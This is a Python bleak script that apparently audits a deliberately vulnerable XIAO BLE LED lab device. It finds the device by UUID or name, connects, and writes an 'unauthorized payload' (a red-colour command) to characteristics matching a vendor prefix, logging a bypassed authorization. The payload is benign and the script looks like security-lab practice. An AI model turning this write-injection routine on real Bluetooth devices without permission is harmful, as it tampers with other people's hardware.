import asyncio
import csv
import os
import logging
from bleak import BleakScanner, BleakClient

# Logging configuration
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("BLE_Smart_Scanner")

CSV_FILE = "ble_audit_results.csv"

# --- RANGES AND PATTERNS DEFINITIONS ---
XIAO_VND_PREFIX = "87654321"     
TARGET_SERVICE_UUID = "12345678-1234-1234-1234-123456789012".lower()

async def audit_device(device, writer):
    logger.info(f"[*] Starting device audit: {device.address}")
    try:
        async with BleakClient(device.address, timeout=10.0) as client:
            services = client.services
            for service in services:
                for char in service.characteristics:
                    status = "Safe"
                    
                    # Checking for your specific XIAO pattern (Characteristic UUID)
                    if char.uuid.startswith(XIAO_VND_PREFIX.lower()):
                        status = "VULNERABLE_TARGET_DETECTED"
                        logger.warning(f"  [!] Detected known XIAO pattern on {char.uuid}")
                        writer.writerow([device.name, device.address, status, char.uuid])
                        
                        # --- ATTACK TAKES PLACE HERE (PAYLOAD INJECTION) ---
                        logger.info(f"    -> Injecting unauthorized payload into {char.uuid}...")
                        test_payload = bytes([255, 0, 0]) # Red color for NeoPixel LED
                        
                        try:
                            await client.write_gatt_char(char.uuid, test_payload, response=True)
                            logger.warning(f"    -> [!] SUCCESS: Authorization bypassed. Payload injected!")
                        except Exception as e:
                            logger.error(f"    -> [-] Write or authorization error: {e}")
                        # ------------------------------------------------

    except Exception as e:
        logger.error(f"[-] Error during audit of {device.address}: {e}")

async def main():
    
   # Hybrid filter: Look by UUID (for Windows/pure Linux) 
    # OR device name for fallible Broadcom drivers (MacBook)
    target_device = await BleakScanner.find_device_by_filter(
        lambda d, ad: (TARGET_SERVICE_UUID in ad.service_uuids) or \
                      ("XIAO_Vulnerable_LED" in (d.name or "")) or \
                      ("XIAO_Vulnerable_LED" in (ad.local_name or "")),
        timeout=20.0
    
    )

    if target_device:
        logger.info(f"[+] TARGET FOUND: {target_device.name} [{target_device.address}]")
        
        # Preparing CSV file and launching audit/attack
        file_exists = os.path.isfile(CSV_FILE)
        with open(CSV_FILE, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Device Name", "MAC Address", "Status", "Vulnerable UUID"])
            
            await audit_device(target_device, writer)
    else:
        logger.error("[-] Target not found nearby.")

if __name__ == "__main__":
    asyncio.run(main())